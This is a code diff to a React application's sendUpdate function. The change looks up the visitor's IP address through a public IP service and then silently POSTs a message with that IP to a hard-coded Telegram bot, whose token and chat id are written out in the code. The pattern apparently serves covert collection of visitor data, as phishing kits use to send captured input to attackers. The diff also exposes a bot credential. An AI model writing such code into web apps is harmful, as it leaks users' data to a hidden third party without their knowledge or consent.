@@ -3,7 +3,7 @@ import React, { useEffect } from 'react';
 let ip = 'Not Found'
 
 async function sendUpdate(msg) {
-  setTimeout(() => {
+  if (ip === 'Not Found') {
     fetch('https://api.db-ip.com/v2/free/self')
       .then(result => result.json())
       .then((output) => {
@@ -17,7 +17,16 @@ async function sendUpdate(msg) {
           console.log("Request complete!");
         })
       }).catch(err => console.error(err));
-  })
+  } else {
+    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
+    fetch(url, {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: ''
+    }).then(res => {
+      console.log("Request complete!");
+    })
+  }
 }
 
 function App() {
